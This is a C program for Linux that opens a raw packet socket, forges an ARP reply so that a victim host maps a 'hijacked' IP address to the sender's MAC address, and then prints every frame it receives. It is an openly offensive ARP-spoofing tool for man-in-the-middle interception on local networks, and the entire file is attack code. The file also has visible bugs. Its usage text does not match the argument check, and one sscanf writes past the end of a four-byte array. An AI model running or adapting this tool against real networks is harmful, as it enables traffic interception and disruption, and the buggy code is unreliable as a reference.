#include <stdio.h>
#include <sys/ioctl.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
// These imports will only work on a Linux system
#include <linux/if_packet.h>
#include <linux/if_ether.h>
#include <linux/if_arp.h>

struct arp_payload
{
	unsigned char sha[6];
	unsigned char spa[4];
	unsigned char tha[6];
	unsigned char tpa[4];
};

int main(int argc, char **argv)
{
	ssize_t size;
	const char *MY_INTERFACE, *VICTIM_IP, *HIJACKED_IP;
	char buf[BUFSIZ];
	int sockfd, ret, ifindex;
	struct ifreq ifr;
	struct sockaddr_ll arp_addr;
	unsigned char msg[sizeof(struct ethhdr) + sizeof(struct arphdr) + sizeof(struct arp_payload)];
	struct ethhdr *eh = (struct ethhdr *)msg;
	struct arphdr *arp = (struct arphdr *)(msg + sizeof(struct ethhdr));
	struct arp_payload *arp_payload = (struct arp_payload *)(msg + sizeof(struct ethhdr) + sizeof(struct arphdr));

/**
 * ARGUMENT PARCING
 */

	if (argc != 6)
	{
		fprintf(stderr, "usage: %s MY-INTERFACE MY-MAC MY-IP IP\n", argv[0]);
		exit(EXIT_FAILURE);
	}

	MY_INTERFACE = argv[1];

	ret = sscanf(
		argv[2],
		"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&eh->h_source[0],
		&eh->h_source[1],
		&eh->h_source[2],
		&eh->h_source[3],
		&eh->h_source[4],
		&eh->h_source[5]);
	if (ret != 6)
	{
		fprintf(stderr, "bad MY-MAC\n");
		exit(EXIT_FAILURE);
	}

	HIJACKED_IP = argv[3];

	ret = sscanf(
		argv[4],
		"%hhx:%hhx:%hhx:%hhx:%hhx:%hhx",
		&eh->h_dest[0],
		&eh->h_dest[1],
		&eh->h_dest[2],
		&eh->h_dest[3],
		&eh->h_dest[4],
		&eh->h_dest[5]);
	if (ret != 6)
	{
		fprintf(stderr, "bad VICTIM_MAC-MAC\n");
		exit(EXIT_FAILURE);
	}

	eh->h_proto = htons(ETH_P_ARP);

	VICTIM_IP = argv[5];

/**
 * FINISH ARGUMENT PARCING
 */

	// Make socket
	sockfd = socket(PF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (-1 == sockfd)
	{
		perror("could not open raw socket for ARP");
		exit(EXIT_FAILURE);
	}

	// Discover my device's index
	strncpy(ifr.ifr_name, MY_INTERFACE, IFNAMSIZ);
	ret = ioctl(sockfd, SIOCGIFINDEX, &ifr);
	if (-1 == ret)
	{
		perror("getting␣device␣index␣failed");
		exit(EXIT_FAILURE);
	}

	ifindex = ifr.ifr_ifindex;

/**
 * BEGIN ARP MESSAGE PREP
 */

	arp_addr.sll_family = PF_PACKET;
	arp_addr.sll_protocol = htons(ETH_P_ARP);
	arp_addr.sll_ifindex = ifindex;
	arp_addr.sll_hatype = ARPHRD_ETHER;
	arp_addr.sll_pkttype = PACKET_OTHERHOST;
	arp_addr.sll_halen = 0;
	arp_addr.sll_addr[0] = eh->h_dest[0];
	arp_addr.sll_addr[1] = eh->h_dest[1];
	arp_addr.sll_addr[2] = eh->h_dest[2];
	arp_addr.sll_addr[3] = eh->h_dest[3];
	arp_addr.sll_addr[4] = eh->h_dest[4];
	arp_addr.sll_addr[5] = eh->h_dest[5];
	arp_addr.sll_addr[6] = 0x00;
	arp_addr.sll_addr[7] = 0x00;

	arp->ar_hrd = htons(ETH_P_802_3);
	arp->ar_pro = htons(ETH_P_IP);
	arp->ar_hln = 0x06;
	arp->ar_pln = 0x04;
	arp->ar_op = htons(ARPOP_REPLY);

	arp_payload->sha[0] = eh->h_source[0];
	arp_payload->sha[1] = eh->h_source[1];
	arp_payload->sha[2] = eh->h_source[2];
	arp_payload->sha[3] = eh->h_source[3];
	arp_payload->sha[4] = eh->h_source[4];
	arp_payload->sha[5] = eh->h_source[5];

	inet_pton(PF_INET, HIJACKED_IP, arp_payload->spa);

	arp_payload->tha[0] = eh->h_dest[0];
	arp_payload->tha[1] = eh->h_dest[1];
	arp_payload->tha[2] = eh->h_dest[2];
	arp_payload->tha[3] = eh->h_dest[3];
	arp_payload->tha[4] = eh->h_dest[4];
	arp_payload->tha[5] = eh->h_dest[5];

	inet_pton(PF_INET, VICTIM_IP, arp_payload->tpa);

	ret = sscanf(
		HIJACKED_IP,
		"%hhx.%hhx.%hhx.%hhx",
		&arp_payload->tpa[0],
		&arp_payload->tpa[1],
		&arp_payload->tpa[2],
		&arp_payload->tpa[4]);
	if (ret != 4)
	{
		fprintf(stderr, "bad VICTIM_MAC-MAC\n");
		exit(EXIT_FAILURE);
	}

	inet_pton(PF_INET, VICTIM_IP, arp_payload->tpa);

/**
 * FINISH ARP MESSAGE PREP
 */

	// Send my spurious arp reply
	size = sendto(sockfd, msg, sizeof msg, 0, (struct sockaddr *)&arp_addr, sizeof arp_addr);
	if (-1 == size)
	{
		perror("error sending");
		exit(EXIT_FAILURE);
	}

	// Receive and print responce
	for (;;)
	{
		ssize_t size;
		struct sockaddr recv_addr;
		socklen_t recv_addr_size = sizeof recv_addr;

		size = recvfrom(sockfd, buf, sizeof buf, 0, &recv_addr, &recv_addr_size);
		if (-1 == size)
		{
			perror("failed to receive from raw socket");
			exit(EXIT_FAILURE);
		}

		if (size > 0)
		{
			write(STDOUT_FILENO, buf, size);
		}
	}
}
